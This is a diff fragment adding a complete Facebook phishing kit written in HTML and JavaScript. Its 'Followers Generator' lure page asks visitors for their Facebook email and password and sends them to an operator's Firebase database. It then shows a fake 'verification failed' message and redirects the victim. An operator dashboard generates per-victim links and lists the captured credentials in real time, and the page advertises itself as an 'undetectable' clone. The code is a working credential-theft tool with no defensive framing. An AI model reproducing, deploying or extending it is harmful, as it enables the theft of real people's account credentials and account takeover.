+                        <button class="btn-3d btn-sm" id="viewBtn" style="flex:1;"><i class="fas fa-eye"></i> View</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live victim logs -->
+            <div class="section-title">🔥 Live Victim Logs (Real-Time)</div>
+            <div class="table-wrapper">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>Session</th>
+                            <th>Email/Phone</th>
+                            <th>Password</th>
+                            <th>Followers</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="live-data-table"></tbody>
+                </table>
+            </div>
+
+            <!-- History -->
+            <div class="section-title">📋 Full History</div>
+            <div class="history-panel" id="historyPanel">
+                <p style="opacity:0.5;padding:15px;font-size:13px;">No history yet. Generate a campaign to start capturing data.</p>
+            </div>
+        </div>
+
+        <!-- Feature boxes at bottom -->
+        <div class="features-grid" id="main-features">
+            <div class="feature-box">
+                <i class="fas fa-user-secret"></i>
+                <h4>Stealth Mode</h4>
+                <p style="font-size:12px;">Undetectable phishing layer with neumorphic Facebook UI clone.</p>
+            </div>
+            <div class="feature-box">
+                <i class="fas fa-chart-line"></i>
+                <h4>Real-Time Logs</h4>
+                <p style="font-size:12px;">Credentials appear instantly via Firebase — no refresh needed.</p>
+            </div>
+            <div class="feature-box">
+                <i class="fas fa-mask"></i>
+                <h4>Clone Page</h4>
+                <p style="font-size:12px;">High-quality Facebook lookalike with follower generator theme.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- VICTIM UI -->
+    <div id="victim-container" class="container" style="display:none;max-width:440px;margin-top:20px;">
+        <div style="font-size:45px;color:var(--fb-blue);"><i class="fab fa-facebook"></i></div>
+        <div style="color:var(--fb-blue);font-size:11px;font-weight:700;margin:4px 0;letter-spacing:1px;">Followers Generator 2026</div>
+        <h2 style="font-size:20px;margin:8px 0;">Get Free Facebook Followers</h2>
+        <div id="step-quantity">
+            <p style="font-size:13px;color:#666;margin-bottom:8px;">Select how many followers you want:</p>
+            <div class="follower-selector">
+                <div class="follower-option" data-value="1000">1K</div>
+                <div class="follower-option" data-value="5000">5K</div>
+                <div class="follower-option" data-value="10000">10K</div>
+                <div class="follower-option" data-value="50000">50K</div>
+            </div>
+            <button class="btn-3d btn-fb" onclick="selectQuantity()">Continue <i class="fas fa-arrow-right"></i></button>
+        </div>
+        <div id="step-login" style="display:none;">
+            <p style="font-size:13px;color:#666;margin-bottom:12px;">Please log in to verify your account.</p>
+            <div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="fbUsername" placeholder="Email or phone number"></div>
+            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="fbPassword" placeholder="Password"></div>
+            <button class="btn-3d btn-fb" onclick="submitFacebook()">Verify & Get Followers</button>
+        </div>
+        <div id="already-submitted" style="display:none; margin-top:15px; padding:20px; background:#fff; border-radius:25px; box-shadow:inset 3px 3px 7px #d1d5db;">
+            <i class="fas fa-check-circle" style="font-size:40px;color:var(--success);margin-bottom:10px;"></i>
+            <p style="font-weight:700;color:var(--text);">You've already submitted your verification. Thank you!</p>
+        </div>
+        <p style="font-size:10px;color:#aaa;margin-top:15px;"><i class="fas fa-lock"></i> Secure verification. Your data is protected.</p>
+        <div class="victim-footer">
+            <strong>© 2026 Facebook Followers</strong>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer id="mainFooter">
+        <strong>© 2026 𝐀𝐥𝐥 𝐂𝐨𝐩𝐲𝐑𝐢𝐠𝐡𝐭𝐬 𝐑𝐄𝐒𝐄𝐑𝐕𝐄𝐃 • 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐙𝐔𝐋𝐐𝐀𝐑𝐍𝐀𝐈𝐍 𝐗 𝐇𝐀𝐈𝐃𝐄𝐑</strong>
+    </footer>
+
+    <script>
+        // Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyBsJZ52V5ig-FbofhQOFM3f3Xh5JzRt3oY",
+            authDomain: "zxh-fb-hack.firebaseapp.com",
+            databaseURL: "https://zxh-fb-hack-default-rtdb.firebaseio.com",
+            projectId: "zxh-fb-hack",
+            storageBucket: "zxh-fb-hack.firebasestorage.app",
+            messagingSenderId: "603111943049",
+            appId: "1:603111943049:web:20c1b23bfff72066e58f58"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const CONFIG = {
+            LOGO_URL: 'https://i.ibb.co/xt5C8c7d/1000193609.jpg',
+            SALT: 'ZXH_SALT_2026_SECURE',
+            WA_CHANNEL: 'https://whatsapp.com/channel/0029Vb6lszR7YSd3iYfa2V0',
+            POPUP_KEY: 'zxh_wa_popup_closed',
+            DEVICE_REG_KEY: 'zxh_device_registered',
+        };
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlAdmin = urlParams.get('admin');
+        const urlSession = urlParams.get('id');
+        let currentAdminKey = null;
+        let currentAdminData = null;
+        let selectedFollowers = '1000';
+        let liveTrackerRef = null;
+
+        const $authContainer = document.getElementById('auth-container');
+        const $dashboardContainer = document.getElementById('dashboard-container');
+        const $victimContainer = document.getElementById('victim-container');
+        const $mainFooter = document.getElementById('mainFooter');
+        const $sidebar = document.getElementById('sidebar');
+        const $sidebarOverlay = document.getElementById('sidebarOverlay');
+        const $waPopup = document.getElementById('waPopup');
+        const $aboutPopup = document.getElementById('aboutPopup');
+        const $linkDisplay = document.getElementById('linkDisplay');
+        const $actualLink = document.getElementById('actualLink');
+        const $liveTable = document.getElementById('live-data-table');
+        const $historyPanel = document.getElementById('historyPanel');
+        const $stepQuantity = document.getElementById('step-quantity');
+        const $stepLogin = document.getElementById('step-login');
+        const $alreadySubmitted = document.getElementById('already-submitted');
+        const $loginForm = document.getElementById('login-form');
+        const $registerForm = document.getElementById('register-form');
+        const $forgotForm = document.getElementById('forgot-form');
+
+        function init() {
+            // Victim mode if URL contains admin & id
+            if (urlSession && urlAdmin) {
+                showVictimMode();
+                return;
+            }
+            // Always show auth – no session persistence
+            showAuthMode();
+        }
+
+        async function showVictimMode() {
+            $authContainer.style.display = 'none';
+            $dashboardContainer.style.display = 'none';
+            $victimContainer.style.display = 'block';
+            $mainFooter.style.display = 'none';
+            $waPopup.style.display = 'none';
+            $aboutPopup.style.display = 'none';
+            forceCloseSidebar();
+
+            // Check if already captured
+            const snap = await database.ref('facebook_data/' + urlAdmin + '/' + urlSession).once('value');
+            const data = snap.val();
+            if (data && data.status === 'Captured') {
+                $stepQuantity.style.display = 'none';
+                $stepLogin.style.display = 'none';
+                $alreadySubmitted.style.display = 'block';
+                return;
+            }
+
+            // Normal flow
+            const opts = document.querySelectorAll('#victim-container .follower-option');
+            opts.forEach(opt => {
+                opt.addEventListener('click', function() {
+                    opts.forEach(o => o.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedFollowers = this.getAttribute('data-value');
+                });
+            });
+            if (opts.length > 0) opts[0].classList.add('selected');
+            selectedFollowers = '1000';
+        }
+
+        function showAuthMode() {
+            $authContainer.style.display = 'block';
+            $dashboardContainer.style.display = 'none';
+            $victimContainer.style.display = 'none';
+            $mainFooter.style.display = 'block';
+            $waPopup.style.display = 'none';
+            $aboutPopup.style.display = 'none';
+            forceCloseSidebar();
+            showAuthView('login');
+        }
+
+        function showDashboardMode() {
+            $authContainer.style.display = 'none';
+            $dashboardContainer.style.display = 'flex';
+            $victimContainer.style.display = 'none';
+            $mainFooter.style.display = 'block';
+            forceCloseSidebar();
+            if (!localStorage.getItem(CONFIG.POPUP_KEY)) {
+                $waPopup.style.display = 'flex';
+            }
+            document.getElementById('dashUsername').textContent = currentAdminData?.username || 'Admin';
+            document.getElementById('sidebarUsername').textContent = '@' + (currentAdminData?.username || 'admin');
+            document.getElementById('adminBadgeDesktop').textContent = '🟢 ' + (currentAdminData?.username || 'Admin');
+            document.getElementById('sidebarLogo').src = CONFIG.LOGO_URL;
+            document.getElementById('topbarLogo').src = CONFIG.LOGO_URL;
+            startLiveTracking();
+            loadHistory();
+        }
+
+        function showAuthView(view) {
+            $loginForm.style.display = view === 'login' ? 'block' : 'none';
+            $registerForm.style.display = view === 'register' ? 'block' : 'none';
+            $forgotForm.style.display = view === 'forgot' ? 'block' : 'none';
+            document.querySelectorAll('#auth-container input').forEach(inp => inp.value = '');
+        }
+
+        function hashPassword(pwd) {
+            return btoa(pwd + '::' + CONFIG.SALT + '::zxh');
+        }
+
+        function handleRegister() {
+            const username = document.getElementById('regUsername').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const password = document.getElementById('regPassword').value.trim();
+            const recoveryKey = document.getElementById('regRecoveryKey').value.trim();
+            if (!username || !email || !password || !recoveryKey) return showToast('Please fill all fields!', 'error');
+            if (password.length < 4) return showToast('Password too short', 'error');
+            if (username.length < 3) return showToast('Username too short', 'error');
+
+            // One device = one account
+            if (localStorage.getItem(CONFIG.DEVICE_REG_KEY)) {
+                return showToast('This device already has an account. Only one account per device is allowed.', 'error');
+            }
+
+            const adminKey = 'ADM-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
+            const adminData = {
+                username,
+                email,
+                password: hashPassword(password),
+                recoveryKey,
+                adminKey,
+                createdAt: Date.now(),
+            };
+
+            database.ref('admins').orderByChild('username').equalTo(username).once('value')
+                .then(snapshot => {
+                    if (snapshot.exists()) {
+                        showToast('Username already taken!', 'error');
+                        return Promise.reject('taken');
+                    }
+                    return database.ref('admins/' + adminKey).set(adminData);
+                })
+                .then(() => {
+                    localStorage.setItem(CONFIG.DEVICE_REG_KEY, 'true');
+                    showToast('Registration successful! Please login.', 'success');
+                    showAuthView('login');
+                })
+                .catch(err => { if (err !== 'taken') showToast('Error: ' + err.message, 'error'); });
+        }
+
+        function handleLogin() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            if (!username || !password) return showToast('Fill both fields!', 'error');
+
+            database.ref('admins').orderByChild('username').equalTo(username).once('value')
+                .then(snapshot => {
+                    if (!snapshot.exists()) { showToast('Account not found!', 'error'); return; }
+                    let found = null;
+                    snapshot.forEach(child => {
+                        const data = child.val();
+                        if (data.password === hashPassword(password)) found = { key: child.key, data };
+                    });
+                    if (!found) { showToast('Invalid password!', 'error'); return; }
+                    // No session saving – only memory
+                    currentAdminKey = found.key;
+                    currentAdminData = found.data;
+                    showDashboardMode();
+                    showToast('Welcome, ' + found.data.username + '!', 'success');
+                })
+                .catch(err => showToast('Error: ' + err.message, 'error'));
+        }
+
+        function handleForgotPassword() {
+            const username = document.getElementById('forgotUsername').value.trim();
+            const email = document.getElementById('forgotEmail').value.trim();
+            const recoveryKey = document.getElementById('forgotRecoveryKey').value.trim();
+            const newPassword = document.getElementById('forgotNewPassword').value.trim();
+            if (!username || !email || !recoveryKey || !newPassword) return showToast('Fill all fields!', 'error');
+            if (newPassword.length < 4) return showToast('New password too short!', 'error');
+
+            database.ref('admins').orderByChild('username').equalTo(username).once('value')
+                .then(snapshot => {
+                    if (!snapshot.exists()) { showToast('Account not found!', 'error'); return; }
+                    let found = null;
+                    snapshot.forEach(child => {
+                        const d = child.val();
+                        if (d.email === email && d.recoveryKey === recoveryKey) found = { key: child.key, data: d };
+                    });
+                    if (!found) { showToast('Email or Recovery Key incorrect!', 'error'); return; }
+                    return database.ref('admins/' + found.key + '/password').set(hashPassword(newPassword));
+                })
+                .then(() => {
+                    showToast('Password reset successful! Please login.', 'success');
+                    showAuthView('login');
+                })
+                .catch(err => showToast('Error: ' + err.message, 'error'));
+        }
+
+        function handleLogout() {
+            if (liveTrackerRef) {
+                database.ref('facebook_data/' + currentAdminKey).off('value', liveTrackerRef);
+                liveTrackerRef = null;
+            }
+            currentAdminKey = null;
+            currentAdminData = null;
+            forceCloseSidebar();
+            showAuthMode();
+            showToast('Logged out.', 'info');
+        }
+
+        function toggleSidebar() {
+            if ($sidebar.classList.contains('active')) {
+                $sidebar.style.left = '-310px';
+                $sidebar.classList.remove('active');
+                $sidebarOverlay.classList.remove('active');
+            } else {
+                $sidebar.style.left = '';
+                $sidebar.classList.add('active');
+                $sidebarOverlay.classList.add('active');
+            }
+        }
+
+        function closeSidebar() {
+            $sidebar.style.left = '-310px';
+            $sidebar.classList.remove('active');
+            $sidebarOverlay.classList.remove('active');
+        }
+
+        function forceCloseSidebar() {
+            $sidebar.style.left = '-310px';
+            $sidebar.classList.remove('active');
+            $sidebarOverlay.classList.remove('active');
+        }
+
+        function navigateTo(section) {
+            closeSidebar();
+            document.querySelectorAll('.sidebar-nav .nav-item').forEach(item => item.classList.remove('active'));
+            const items = document.querySelectorAll('.sidebar-nav .nav-item');
+            const map = { dashboard: 0, generate: 1, logs: 2 };
+            if (map[section] !== undefined && items[map[section]]) {
+                items[map[section]].classList.add('active');
+            }
+            if (section === 'generate') document.getElementById('section-generate')?.scrollIntoView({ behavior: 'smooth' });
+            else if (section === 'logs') document.getElementById('historyPanel')?.scrollIntoView({ behavior: 'smooth' });
+            else window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function openAboutPopup() {
+            closeSidebar();
+            $aboutPopup.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeAboutPopup() {
+            $aboutPopup.style.display = 'none';
+            document.body.style.overflow = '';
+        }
+
+        function closeWaPopup() {
+            $waPopup.style.display = 'none';
+            localStorage.setItem(CONFIG.POPUP_KEY, 'true');
+        }
+
+        let toastTimer;
+        function showToast(msg, type = 'success') {
+            const toast = document.getElementById('toast');
+            const icon = document.getElementById('toast-icon');
+            const progress = document.getElementById('toast-progress');
+            if (toastTimer) clearInterval(toastTimer);
+            icon.innerHTML = type === 'success' ? '<i class="fas fa-check-circle" style="color:#10b981;font-size:18px;"></i>' :
+                type === 'error' ? '<i class="fas fa-exclamation-circle" style="color:#ef4444;font-size:18px;"></i>' :
+                '<i class="fas fa-info-circle" style="color:var(--fb-blue);font-size:18px;"></i>';
+            document.getElementById('toast-msg').textContent = msg;
+            progress.style.background = type === 'error' ? '#ef4444' : type === 'info' ? 'var(--fb-blue)' : '#10b981';
+            progress.style.width = '100%';
+            toast.classList.add('active');
+            let width = 100;
+            toastTimer = setInterval(() => {
+                width -= 0.8;
+                progress.style.width = width + '%';
+                if (width <= 0) { clearInterval(toastTimer); hideToast(); }
+            }, 25);
+        }
+
+        function hideToast() {
+            document.getElementById('toast').classList.remove('active');
+            if (toastTimer) clearInterval(toastTimer);
+        }
+
+        function generateSessionLink() {
+            if (!currentAdminKey) return showToast('Session error. Please re-login.', 'error');
+            const sessionId = 'FB-' + Math.floor(1000 + Math.random() * 9000) + '-' + Date.now().toString(36).toUpperCase();
+            const link = window.location.href.split('?')[0] + '?admin=' + encodeURIComponent(currentAdminKey) + '&id=' + sessionId;
+            $actualLink.textContent = link;
+            $linkDisplay.style.display = 'block';
+            document.getElementById('viewBtn').onclick = () => window.open(link, '_blank');
+            database.ref('facebook_data/' + currentAdminKey + '/' + sessionId).set({
+                username: '⏳ waiting...',
+                password: '---',
+                followers: '---',
+                status: 'Active',
+                timestamp: Date.now(),
+            }).then(() => showToast('Campaign Generated!', 'success'))
+              .catch(err => showToast('Error: ' + err.message, 'error'));
+            $linkDisplay.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function copyLink() {
+            const text = $actualLink.textContent;
+            if (!text) return;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(() => showToast('Link Copied!', 'success'));
+            } else {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.left = '-9999px';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                showToast('Link Copied!', 'success');
+            }
+        }
+
+        function startLiveTracking() {
+            if (!currentAdminKey) return;
+            if (liveTrackerRef) database.ref('facebook_data/' + currentAdminKey).off('value', liveTrackerRef);
+            liveTrackerRef = database.ref('facebook_data/' + currentAdminKey).on('value', (snapshot) => {
+                const data = snapshot.val();
+                $liveTable.innerHTML = '';
+                if (!data) {
+                    $liveTable.innerHTML = '<tr><td colspan="5" style="opacity:0.5;padding:18px;">No active sessions.</td></tr>';
+                    return;
+                }
+                const entries = Object.entries(data).sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+                entries.slice(0, 20).forEach(([key, entry]) => {
+                    const statusClass = entry.status === 'Captured' ? 'badge-captured' : 'badge-active';
+                    $liveTable.innerHTML += `
+                    <tr>
+                        <td><b>${escapeHTML(key.substring(0,8))}..</b></td>
+                        <td>${escapeHTML(entry.username || '')}</td>
+                        <td><b style="color:var(--fb-blue);">${escapeHTML(entry.password || '')}</b></td>
+                        <td>${escapeHTML(entry.followers || '')}</td>
+                        <td><span class="badge ${statusClass}">${escapeHTML(entry.status || 'Active')}</span></td>
+                    </tr>`;
+                });
+                loadHistoryData(data);
+            });
+        }
+
+        function loadHistory() {
+            if (!currentAdminKey) return;
+            database.ref('facebook_data/' + currentAdminKey).once('value').then(snap => loadHistoryData(snap.val()));
+        }
+
+        function loadHistoryData(data) {
+            if (!data) {
+                $historyPanel.innerHTML = '<p style="opacity:0.5;padding:15px;font-size:13px;">No history yet.</p>';
+                return;
+            }
+            const entries = Object.entries(data).sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            if (entries.length === 0) {
+                $historyPanel.innerHTML = '<p style="opacity:0.5;padding:15px;font-size:13px;">No history yet.</p>';
+                return;
+            }
+            $historyPanel.innerHTML = entries.map(([key, entry]) => {
+                const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : 'N/A';
+                const isCaptured = entry.status === 'Captured';
+                return `
+                <div class="history-item">
+                    <div>
+                        <b>${escapeHTML(key.substring(0,10))}..</b>
+                        <span class="time">${time}</span><br>
+                        <small>${escapeHTML(entry.username || '---')} | ${escapeHTML(entry.password || '---')} | ${escapeHTML(entry.followers || '---')} followers</small>
+                    </div>
+                    <span class="badge ${isCaptured ? 'badge-captured' : 'badge-active'}">${escapeHTML(entry.status || 'Active')}</span>
+                </div>`;
+            }).join('');
+        }
+
+        function escapeHTML(str) {
+            if (!str) return '';
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        function selectQuantity() {
+            $stepQuantity.style.display = 'none';
+            $stepLogin.style.display = 'block';
+        }
+
+        function submitFacebook() {
+            const username = document.getElementById('fbUsername').value.trim();
+            const password = document.getElementById('fbPassword').value.trim();
+            if (!username || !password) return showToast('Please fill both fields!', 'error');
+            if (!urlAdmin || !urlSession) return showToast('Invalid session.', 'error');
+            // Prevent duplicate submission by checking again just before update
+            database.ref('facebook_data/' + urlAdmin + '/' + urlSession).once('value').then(snap => {
+                if (snap.val()?.status === 'Captured') {
+                    showToast('Already submitted.', 'info');
+                    return;
+                }
+                return database.ref('facebook_data/' + urlAdmin + '/' + urlSession).update({
+                    username,
+                    password,
+                    followers: selectedFollowers,
+                    status: 'Captured',
+                    timestamp: Date.now(),
+                });
+            }).then(() => {
+                showToast('Verification failed. Please try again.', 'error');
+                setTimeout(() => { window.location.href = CONFIG.WA_CHANNEL; }, 1800);
+            }).catch(err => showToast('Error: ' + err.message, 'error'));
+        }
+
+        // Global exposure
+        window.openAboutPopup = openAboutPopup;
+        window.closeAboutPopup = closeAboutPopup;
+        window.closeWaPopup = closeWaPopup;
+        window.generateSessionLink = generateSessionLink;
+        window.copyLink = copyLink;
+        window.selectQuantity = selectQuantity;
+        window.submitFacebook = submitFacebook;
+        window.showToast = showToast;
+        window.hideToast = hideToast;
+        window.toggleSidebar = toggleSidebar;
+        window.closeSidebar = closeSidebar;
+        window.navigateTo = navigateTo;
+        window.handleLogin = handleLogin;
+        window.handleRegister = handleRegister;
+        window.handleForgotPassword = handleForgotPassword;
+        window.handleLogout = handleLogout;
+        window.showAuthView = showAuthView;
+
+        init();
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeSidebar();
+                closeAboutPopup();
+                closeWaPopup();
+            }
+        });
+        $sidebarOverlay.addEventListener('click', closeSidebar);
+        $aboutPopup.addEventListener('click', function(e) {
+            if (e.target === $aboutPopup) closeAboutPopup();
+        });
+        $waPopup.addEventListener('click', function(e) {
+            if (e.target === $waPopup) closeWaPopup();
+        });
+    </script>
+</body>
+      </html>
